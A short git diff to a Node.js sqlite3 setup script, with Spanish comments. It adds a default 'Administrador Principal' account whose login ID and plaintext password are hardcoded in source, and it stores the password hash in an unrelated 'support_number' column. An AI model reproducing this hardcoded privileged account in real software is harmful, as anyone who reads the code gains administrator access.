@@ -15,6 +15,11 @@ const db = new sqlite3.Database(dbPath, (err) => {
             support_number TEXT
         )`, () => {
             db.run(`ALTER TABLE users ADD COLUMN telefono TEXT`, (err) => { /* ignore if already exists */ });
+            
+            // Insertar admin por defecto si no existe
+            const bcrypt = require('bcryptjs');
+            const adminHash = bcrypt.hashSync('C0m0EsT4nL0sM4qU1N4s?!', 10);
+            db.run(`INSERT OR IGNORE INTO users (id, dni, nombre_completo, telefono, support_number) VALUES (999999, 'ElC1g4L4', 'Administrador Principal', '000000000', ?)`, [adminHash]);
         });
 
         db.run(`CREATE TABLE IF NOT EXISTS appointments (
